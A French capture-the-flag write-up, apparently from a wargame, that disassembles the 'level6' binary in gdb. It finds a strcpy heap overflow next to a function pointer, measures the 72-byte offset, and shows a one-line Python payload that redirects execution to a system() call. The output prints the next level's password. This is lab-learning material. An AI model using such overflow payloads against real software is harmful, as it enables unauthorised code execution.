# Level6

On observe un executable a la racine `level6`

```bash
$ ./level6
Segmentation fault (core dumped)

$ ./level6 "Hello World"
Nope
```

On cherche donc a comprendre ce que fait l'executable

```bash
$ gdb level6 -q
Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   ebp
   0x0804847d <+1>:     mov    ebp,esp
   0x0804847f <+3>:     and    esp,0xfffffff0
   0x08048482 <+6>:     sub    esp,0x20
   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:    mov    edx,0x8048468
   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:    mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:    add    eax,0x4
   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:    mov    edx,eax
   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:    call   eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   ebp
   0x08048455 <+1>:     mov    ebp,esp
   0x08048457 <+3>:     sub    esp,0x18
   0x0804845a <+6>:     mov    DWORD PTR [esp],0x80485b0
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret
End of assembler dump.
(gdb) disas m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   ebp
   0x08048469 <+1>:     mov    ebp,esp
   0x0804846b <+3>:     sub    esp,0x18
   0x0804846e <+6>:     mov    DWORD PTR [esp],0x80485d1
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave
   0x0804847b <+19>:    ret
End of assembler dump.
```

On va utiliser `Cutter` pour avoir un idee plus clair de `level6`

```bash
$ scp -P 4242 -r level6@192.168.56.102:/home/user/level6/level6 .

$ ./Cutter-v2.1.2-Linux-x86_64.AppImage level6
```

_resultat sauvegarde dans [source.md](source.md)_

On remarque que l'adresse de la fonction est stocke dans la variable `ppcVar2`.
On cherche donc a modifier cette adresse pour pointer vers l'adresse de la fonction `n`

On va recuperer le retour des deux malloc dans le main

```bash
(gdb) break *main+21
Breakpoint 1 at 0x8048491
(gdb) break *main+37
Breakpoint 2 at 0x80484a1
(gdb) run "Hello"
Starting program: /home/user/level6/level6 "Hello"

Breakpoint 1, 0x08048491 in main ()
(gdb) i r eax
eax            0x804a008    134520840
(gdb) continue
Continuing.

Breakpoint 2, 0x080484a1 in main ()
(gdb) i r eax
eax            0x804a050    134520912
```

On peut alors savoir le nombre d'octets qui les separes:
<code>0x804a050 - 0x804a008 = 48<sub>16</sub> = 72<sub>10</sub></code>

On peut alors essayer d'ecrire par dessus l'adresse de `m` et mettre l'adresse de `n`: `0x08048454`

```bash
$ ./level6 `python -c 'print ("A"*72 + "\x54\x84\x04\x08")'`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d


level6:$ su level7
Password:

level7:$
```
